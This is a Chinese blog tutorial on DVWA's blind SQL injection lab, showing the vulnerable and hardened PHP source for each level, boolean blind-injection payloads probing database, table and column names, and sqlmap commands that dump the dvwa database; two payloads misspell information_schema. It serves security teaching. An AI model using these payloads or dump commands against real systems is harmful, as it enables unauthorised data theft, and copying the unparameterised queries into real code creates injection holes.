<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Security ❀ SQL Injection (Blind) SQL盲注 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Security ❀ SQL Injection (Blind) SQL盲注" />
<meta property="og:description" content="文章目录 1、low2、medium3、high4、impossible5、使用sqlmap进行盲注 1、low 源码解析：
&lt;?php if( isset( $_GET[ &#39;Submit&#39; ] ) ) { // Get input $id = $_GET[ &#39;id&#39; ]; // Check database $getid = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;; $result = mysqli_query($GLOBALS[&#34;___mysqli_ston&#34;], $getid ); // Removed &#39;or die&#39; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#39;@&#39; character suppresses errors if( $num &gt; 0 ) { // Feedback for end user echo &#39;&lt;pre&gt;User ID exists in the database." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/7de258b8e3acc36c27a691ccafbe1431/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-11-10T17:22:12+08:00" />
<meta property="article:modified_time" content="2021-11-10T17:22:12+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Security ❀ SQL Injection (Blind) SQL盲注</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#1low_2" rel="nofollow">1、low</a></li><li><a href="#2medium_70" rel="nofollow">2、medium</a></li><li><a href="#3high_102" rel="nofollow">3、high</a></li><li><a href="#4impossible_141" rel="nofollow">4、impossible</a></li><li><a href="#5sqlmap_182" rel="nofollow">5、使用sqlmap进行盲注</a></li></ul> 
</div> 
<p></p> 
<h2><a id="1low_2"></a>1、low</h2> 
<hr> 
<p>源码解析：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Check database</span>
    <span class="token variable">$getid</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$getid</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Removed 'or die' to suppress mysql errors</span>

    <span class="token comment">// Get results</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> @<span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// The '@' character suppresses errors</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$num</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// Feedback for end user</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// User wasn't found, so the page wasn't!</span>
        <span class="token function">header</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' 404 Not Found'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Feedback for end user</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token argument-name">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>盲注只能回显用户ID是否存在，无其他回显内容，除此之外攻击基本相同，参考第8章 SQL注入；<br> 盲注需要进行判断名称长度与猜测名称字符；较大的数据库人为盲注较为吃力，因此使用软件sqlmap进行盲注，详见第五节；</p> 
<p>盲注执行命令<br> 数据库长度是否大于1（支持大于，小于，等于，可以获取对应数值进行判断）</p> 
<pre><code class="prism language-sql"><span class="token number">1</span>' <span class="token operator">and</span> length<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">1</span> <span class="token comment">#</span>
</code></pre> 
<p>猜解数据库名称字符ASCII码是否大于1</p> 
<pre><code class="prism language-sql"><span class="token number">1</span>' <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">1</span> <span class="token comment">#</span>
</code></pre> 
<p>表名长度是否大于1</p> 
<pre><code>1' and length(substr((select table_name from infomation_schema.tables where table_schema=database() limit 0,1),1))&gt;1 #
</code></pre> 
<p>猜解表名称字符ASCII码是否大于1</p> 
<pre><code class="prism language-sql"><span class="token number">1</span>' <span class="token operator">and</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> infomation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">1</span> <span class="token comment">#</span>
</code></pre> 
<p>列名长度是否等于1</p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">' and (select count(column_name) from information_schema.columns where table_name= '</span>users'<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span>
</code></pre> 
<p>猜解列名字符ASCII码是否等于7</p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">'and length(substr((select column_name from information_schema.columns where table_name= '</span>users' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">7</span> <span class="token comment">#</span>
</code></pre> 
<p>验证成功；<br> <img src="https://images2.imgbox.com/9f/93/iqUuBheM_o.png" alt="在这里插入图片描述"></p> 
<p>验证失败；<br> <img src="https://images2.imgbox.com/c1/4c/tnwZ4Zz8_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="2medium_70"></a>2、medium</h2> 
<hr> 
<p>源码解析：同SQL注入源码，mysqli_real_escape_string函数过滤关键字；</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span>  <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$id</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Check database</span>
    <span class="token variable">$getid</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="token interpolation"><span class="token variable">$id</span></span>;"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$getid</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Removed 'or die' to suppress mysql errors</span>

    <span class="token comment">// Get results</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> @<span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// The '@' character suppresses errors</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$num</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// Feedback for end user</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// Feedback for end user</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">//mysql_close();</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<h2><a id="3high_102"></a>3、high</h2> 
<hr> 
<p>源码解析：同SQL注入源码，LIMIT限制返回信息数量；\</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Check database</span>
    <span class="token variable">$getid</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 1;"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$getid</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Removed 'or die' to suppress mysql errors</span>

    <span class="token comment">// Get results</span>
    <span class="token variable">$num</span> <span class="token operator">=</span> @<span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// The '@' character suppresses errors</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$num</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// Feedback for end user</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// Might sleep a random amount</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">// User wasn't found, so the page wasn't!</span>
        <span class="token function">header</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' 404 Not Found'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Feedback for end user</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token argument-name">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<h2><a id="4impossible_141"></a>4、impossible</h2> 
<hr> 
<p>源码解析：使用token进行验证，查询内容只能为具体数字；</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// Check Anti-CSRF token</span>
    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Get input</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Was a number entered?</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// Check the database</span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':id'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Get results</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token comment">// Feedback for end user</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token comment">// User wasn't found, so the page wasn't!</span>
            <span class="token function">header</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span> <span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' 404 Not Found'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">// Feedback for end user</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<h2><a id="5sqlmap_182"></a>5、使用sqlmap进行盲注</h2> 
<hr> 
<p>（sqlmap可以在kali内直接使用，或者参考《Windows系统下如何使用sqlmap》文档在Windows上使用）<br> <a href="https://blog.csdn.net/qq_42197548/article/details/121250800?spm=1001.2014.3001.5502">《Windows系统下如何使用sqlmap》</a><br> 使用Burpsuite获取http请求数据信息；<br> <img src="https://images2.imgbox.com/ac/a3/dGWujdMO_o.png" alt="在这里插入图片描述"></p> 
<p>抓包如下；<br> <img src="https://images2.imgbox.com/75/07/gKgZmGKj_o.png" alt="在这里插入图片描述"></p> 
<p>将数据包内容复制在新文本文件内，并修改名称为1.txt（名称任意，为了方便输入需要简化）；<br> <img src="https://images2.imgbox.com/ab/a2/irpjSaGE_o.png" alt="在这里插入图片描述"></p> 
<p>将1.txt放在sqlmap执行脚本所在目录下<br> <img src="https://images2.imgbox.com/38/45/FScX2oJX_o.png" alt="在这里插入图片描述"></p> 
<p>打开桌面sqlmap快捷方式，并按照下面命令进行输入：<br> 获取数据库表</p> 
<pre><code>C:\Users\Administrator\AppData\Local\Programs\Python\Python38\sqlmap&gt;sqlmap.py -r 1.txt -dbs
</code></pre> 
<p>结果验证：<br> <img src="https://images2.imgbox.com/70/97/WiIJbvjw_o.png" alt="在这里插入图片描述"></p> 
<p>获取表数据</p> 
<pre><code>C:\Users\Administrator\AppData\Local\Programs\Python\Python38\sqlmap&gt;sqlmap.py -r 1.txt -D dvwa -dump-all
</code></pre> 
<p>结果验证：<br> <img src="https://images2.imgbox.com/9c/ca/uCUKlpag_o.png" alt="在这里插入图片描述"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/ab120b646816ac557c57985669657dd9/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Security ❀ SQL Injection SQL注入</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/ab9f5948a688e1579fe1a2bfc5acf6b5/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">修改--案例 全部删除</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>